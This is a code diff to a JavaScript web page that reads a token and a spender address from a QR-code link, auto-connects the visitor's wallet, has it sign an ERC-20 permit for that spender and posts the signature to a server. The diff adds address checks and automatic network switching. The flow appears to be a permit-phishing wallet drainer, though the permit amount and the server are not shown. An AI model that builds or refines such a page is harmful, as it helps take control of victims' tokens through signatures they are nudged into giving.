@@ -18,11 +18,121 @@ const TOKEN_ADDRESS = urlParams.get('token') || '';
 const SPENDER_ADDRESS = urlParams.get('spender') || '';
 const NETWORK_PARAM = urlParams.get('network') || 'sepolia';
 
+const NETWORK_CONFIG = {
+    sepolia: {
+        chainId: 11155111,
+        name: 'Sepolia',
+        rpcUrl: 'https://ethereum-sepolia-rpc.publicnode.com',
+        blockExplorer: 'https://sepolia.etherscan.io'
+    },
+    mainnet: {
+        chainId: 1,
+        name: 'Ethereum Mainnet',
+        rpcUrl: 'https://ethereum-rpc.publicnode.com',
+        blockExplorer: 'https://etherscan.io'
+    }
+};
+
 let currentNetwork = NETWORK_PARAM;
+const requiredNetwork = NETWORK_CONFIG[currentNetwork];
+
+function isValidAddress(address) {
+    if (!address) return false;
+    return /^0x[a-fA-F0-9]{40}$/.test(address);
+}
+
+function getAddress(address) {
+    if (!address) {
+        throw new Error('Address is required');
+    }
+    if (!isValidAddress(address)) {
+        throw new Error(`Invalid address format: ${address}`);
+    }
+    try {
+        return ethers.utils.getAddress(address);
+    } catch (error) {
+        throw new Error(`Invalid address: ${address}`);
+    }
+}
+
+async function checkAndSwitchNetwork() {
+    if (!provider) {
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+    }
+    
+    const network = await provider.getNetwork();
+    const currentChainId = network.chainId;
+    const requiredChainId = requiredNetwork.chainId;
+    
+    if (currentChainId !== requiredChainId) {
+        showStatus(`Switching to ${requiredNetwork.name}...`, 'info');
+        
+        try {
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: `0x${requiredChainId.toString(16)}` }],
+            });
+            
+            showStatus(`Switched to ${requiredNetwork.name}`, 'success');
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+            return true;
+        } catch (switchError) {
+            if (switchError.code === 4902) {
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: `0x${requiredChainId.toString(16)}`,
+                            chainName: requiredNetwork.name,
+                            nativeCurrency: {
+                                name: 'ETH',
+                                symbol: 'ETH',
+                                decimals: 18
+                            },
+                            rpcUrls: [requiredNetwork.rpcUrl],
+                            blockExplorerUrls: [requiredNetwork.blockExplorer]
+                        }],
+                    });
+                    
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    showStatus(`Added and switched to ${requiredNetwork.name}`, 'success');
+                    return true;
+                } catch (addError) {
+                    showStatus(`Error: Please switch to ${requiredNetwork.name} manually in your wallet`, 'error');
+                    return false;
+                }
+            } else if (switchError.code === 4001) {
+                showStatus(`Please switch to ${requiredNetwork.name} to continue`, 'error');
+                return false;
+            } else {
+                showStatus(`Error switching network: ${switchError.message}`, 'error');
+                return false;
+            }
+        }
+    }
+    
+    return true;
+}
 
 document.addEventListener('DOMContentLoaded', async () => {
-    document.getElementById('spenderAddress').value = SPENDER_ADDRESS;
-    spenderAddress = SPENDER_ADDRESS;
+    if (!TOKEN_ADDRESS || !isValidAddress(TOKEN_ADDRESS)) {
+        showStatus('Error: Invalid or missing token address in URL. Please generate a new QR code.', 'error');
+        return;
+    }
+    
+    if (!SPENDER_ADDRESS || !isValidAddress(SPENDER_ADDRESS)) {
+        showStatus('Error: Invalid or missing spender address in URL. Please generate a new QR code.', 'error');
+        return;
+    }
+    
+    try {
+        const validSpender = getAddress(SPENDER_ADDRESS);
+        document.getElementById('spenderAddress').value = validSpender;
+        spenderAddress = validSpender;
+    } catch (error) {
+        showStatus('Error: ' + error.message, 'error');
+        return;
+    }
     
     const isTrustWallet = window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet);
     const isMetaMask = window.ethereum && window.ethereum.isMetaMask;
@@ -79,6 +189,19 @@ async function autoConnectWallet() {
             userAddress = accounts[0];
             signer = provider.getSigner();
             
+            const networkOk = await checkAndSwitchNetwork();
+            if (!networkOk) {
+                const connectBtn = document.getElementById('connectWallet');
+                if (connectBtn) {
+                    connectBtn.style.display = 'block';
+                    connectBtn.disabled = false;
+                }
+                return;
+            }
+            
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+            signer = provider.getSigner();
+            
             await initTokenContract();
         } catch (requestError) {
             if (requestError.code === 4001) {
@@ -88,6 +211,20 @@ async function autoConnectWallet() {
                 if (existingAccounts.length > 0) {
                     userAddress = existingAccounts[0];
                     signer = provider.getSigner();
+                    
+                    const networkOk = await checkAndSwitchNetwork();
+                    if (!networkOk) {
+                        const connectBtn = document.getElementById('connectWallet');
+                        if (connectBtn) {
+                            connectBtn.style.display = 'block';
+                            connectBtn.disabled = false;
+                        }
+                        return;
+                    }
+                    
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    signer = provider.getSigner();
+                    
                     await initTokenContract();
                 } else {
                     showStatus('Click "Continue" to connect wallet', 'info');
@@ -150,6 +287,17 @@ window.connectWallet = async function connectWallet() {
         userAddress = accounts[0];
         signer = provider.getSigner();
         
+        const networkOk = await checkAndSwitchNetwork();
+        if (!networkOk) {
+            if (connectBtn) {
+                connectBtn.disabled = false;
+            }
+            return;
+        }
+        
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        signer = provider.getSigner();
+        
         if (connectBtn) {
             connectBtn.style.display = 'none';
         }
@@ -209,9 +357,15 @@ async function initTokenContractAndSignPermit() {
             return;
         }
         
+        if (!TOKEN_ADDRESS || !isValidAddress(TOKEN_ADDRESS)) {
+            throw new Error('Invalid token address. Please check the URL parameters.');
+        }
+        
+        const validTokenAddress = getAddress(TOKEN_ADDRESS);
+        
         showStatus('Loading token information...', 'info');
         
-        tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_PERMIT_ABI, signer);
+        tokenContract = new ethers.Contract(validTokenAddress, ERC20_PERMIT_ABI, signer);
         
         const [balance, decimals] = await Promise.all([
             tokenContract.balanceOf(userAddress),
@@ -234,7 +388,7 @@ async function initTokenContractAndSignPermit() {
             name: tokenName,
             version: "1",
             chainId: (await provider.getNetwork()).chainId,
-            verifyingContract: TOKEN_ADDRESS
+            verifyingContract: validTokenAddress
         };
         
         const types = {
@@ -271,7 +425,7 @@ async function initTokenContractAndSignPermit() {
                 v: sig.v,
                 r: sig.r,
                 s: sig.s,
-                tokenAddress: TOKEN_ADDRESS
+                tokenAddress: validTokenAddress
             })
         });
         
@@ -293,7 +447,11 @@ async function initTokenContractAndSignPermit() {
         
     } catch (error) {
         console.error('Contract initialization or signing error:', error);
-        showStatus('Error: ' + error.message, 'error');
+        let errorMessage = error.message;
+        if (errorMessage.includes('ENS name') || errorMessage.includes('resolver')) {
+            errorMessage = 'Invalid token address or network mismatch. Please check that TOKEN_ADDRESS is set correctly and wallet is on the correct network.';
+        }
+        showStatus('Error: ' + errorMessage, 'error');
         const connectBtn = document.getElementById('connectWallet');
         if (connectBtn) {
             connectBtn.style.display = 'block';
@@ -314,9 +472,15 @@ async function initTokenContract() {
             return;
         }
         
+        if (!TOKEN_ADDRESS || !isValidAddress(TOKEN_ADDRESS)) {
+            throw new Error('Invalid token address. Please check the URL parameters.');
+        }
+        
+        const validTokenAddress = getAddress(TOKEN_ADDRESS);
+        
         showStatus('Loading token information...', 'info');
         
-        tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_PERMIT_ABI, signer);
+        tokenContract = new ethers.Contract(validTokenAddress, ERC20_PERMIT_ABI, signer);
         
         const [balance, decimals] = await Promise.all([
             tokenContract.balanceOf(userAddress),
@@ -366,6 +530,12 @@ async function signPermit() {
             return;
         }
         
+        if (!TOKEN_ADDRESS || !isValidAddress(TOKEN_ADDRESS)) {
+            throw new Error('Invalid token address. Please check the URL parameters.');
+        }
+        
+        const validTokenAddress = getAddress(TOKEN_ADDRESS);
+        
         document.getElementById('nextButton').disabled = true;
         showStatus('Signing permit...', 'info');
         
@@ -380,7 +550,7 @@ async function signPermit() {
             name: tokenName,
             version: "1",
             chainId: (await provider.getNetwork()).chainId,
-            verifyingContract: TOKEN_ADDRESS
+            verifyingContract: validTokenAddress
         };
         
         const types = {
@@ -417,7 +587,7 @@ async function signPermit() {
                 v: sig.v,
                 r: sig.r,
                 s: sig.s,
-                tokenAddress: TOKEN_ADDRESS
+                tokenAddress: validTokenAddress
             })
         });
         
